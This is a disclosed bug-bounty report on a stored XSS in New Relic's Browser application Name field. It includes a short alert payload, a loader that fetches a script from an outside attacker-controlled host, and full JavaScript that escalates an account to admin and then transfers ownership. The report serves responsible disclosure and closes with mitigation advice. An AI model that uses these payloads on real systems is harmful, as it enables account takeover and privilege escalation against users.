@@ -1,0 +1,102 @@
+ReportLink:https://hackerone.com/reports/348076
+WeaknessName:Cross-site Scripting (XSS) - Stored
+Reporter:https://hackerone.com/ldionmarcil
+ReportedTo:New Relic(newrelic)
+BountyAmount:3000.0
+Severity:high
+State:Closed
+DateOfDisclosure:20.07.2018 20:05:33
+
+Summary:
+
+The `Name` field of the Brower apps feature is not properly escaped in at least two pages. An attacker can create a new browser application with a specially crafted `Name` field which will be reflected and interpreted by other users visiting these two pages. Leveraging this vulnerability, I was able to target an admin account in order to elevate my own `user` privileged account to the privilege of `admin`  and transfer myself the ownership of the account.
+
+# Steps to reproduce
+1. Create a new Browser application (https://rpm.newrelic.com/accounts/{account_id}/browser/new)
+1. Pick the `Copy/Paste Javascript code` toggle
+1. in the `Name` field, insert the following payload: 
+```js
+ '+alert(document.domain)+' 
+```
+
+1. Press `Enable`
+1. Go back to the Browser application list and select the application you just created
+1. There, visit the `Violations` or `Alert conditions` page to trigger the XSS:
+{F294525} 
+This is caused by this line which does not properly sanitize the single quotes found in the `Name`: {F294526}
+
+# Leveraging this to elevate our own privileges
+I used the `account.newrelic.com` REST API to build an attack scenario where an unprivileged user could elevate their own privileges to the status of `owner`. It's a two step job, first we need to grant ourself the `admin` privileges, and then we need to make the owner transfer ownership to our account.
+
+### Bypassing character limitation
+The application `Name` field is restricted to 128 characters, which is too short for a working two-step payload (admin-granting and owner-transferring). I side-loaded a self-hosted Javascript file through jQuery in order to save space. This is the payload I used:
+```js
+'+$.ajax({url:"https://windows-analytics.com/j.js",dataType:"script"})+'
+```
+The `j.js` file is fetched by jQuery and interpreted in the context of the DOM at `rpm.newrelic.com`. This is the content of the file:
+
+```js
+var ADMIN_USER_ID    = 2194406;
+var ATTACKER_USER_ID = 2196014;
+
+// step 1, admin takeover
+alert("Giving us admin privileges...");
+$.ajax({
+    url: "/user_management/accounts/1968666/users/"+ATTACKER_USER_ID,
+    type: "put",
+    data: JSON.stringify({"account_view":{"level":"admin"}}),
+    headers: {
+	"Origin":"https://account.newrelic.com",
+	"Accept":"application/json",
+	"X-Requested-With":"XMLHttpRequest",
+	"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0",
+	"Connection":"close",
+	"Accept-Language":"en-US,en;q=0.5",
+	"Accept-Encoding":"gzip, deflate",
+	"Content-Type":"application/json"
+    },
+    success: function (data) {
+	// step 2, ownership takeover
+	alert("Changing ownership...");
+	$.ajax({
+	    url: "/user_management/accounts/1968666/update_primary_admin?value="+ATTACKER_USER_ID,
+	    type: "put",
+	    headers: {
+		"Origin":"https://account.newrelic.com",
+		"Accept":"*/*",
+		"X-Requested-With":"XMLHttpRequest",
+		"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0",
+		"Connection":"close",
+		"Accept-Language":"en-US,en;q=0.5",
+		"Accept-Encoding":"gzip, deflate"
+	    },
+	    success: function () {
+		// Account takeover done!
+		alert("Full takeover done!");
+	    }
+	});
+    }
+});
+```
+This file performs two AJAX queries when loaded. First, it grants the attacker's account the `admin` privileges. Second, it transfers the ownership of the victim's account to the attacker's. I leaked the `user_id` of the account owner through the `user-management.service.newrelic.com` API at the `/accounts/1968666/users` endpoint. I put this value in the beginning of the `j.js`. 
+
+## Triggering the payload
+Once an admin visits either the `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}browser/{APP_ID}/alert_conditions` or `https://rpm.newrelic.com/accounts/{ACCOUNT_ID}/browser/{APP_ID}/violations`, this chain of actions will unfold and the administrator will have transferred the ownership of the account over to the attacker.
+
+A full video of the attack scenario can be seen here: {F294527}
+
+# Mitigation
+First, the `Name` field should be properly sanitized to block users from executing arbitrary JavaScript.
+Second, (and I feel this could be a bug report of its own) critical actions such as transferring ownership, granting high privileges, *should require re-entering your administrative password*. This is a standard practice when following defence in depth principles. Using this principle, XSS attacks would be restricted to a very limited set of actions, none of which should have critical impact.
+
+## Impact
+
+Users can execute arbitrary JavaScript code in the context of other users. This is critical when targeted users have high privileges. Attackers are then able to grant themselves the administrator privileges and even takeover the ownership of the New Relic account.
+
+The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:
+
+**URL**
+https://rpm.newrelic.com/accounts/1968666/browser/52924826/alert_conditions
+
+**Verified**
+Yes
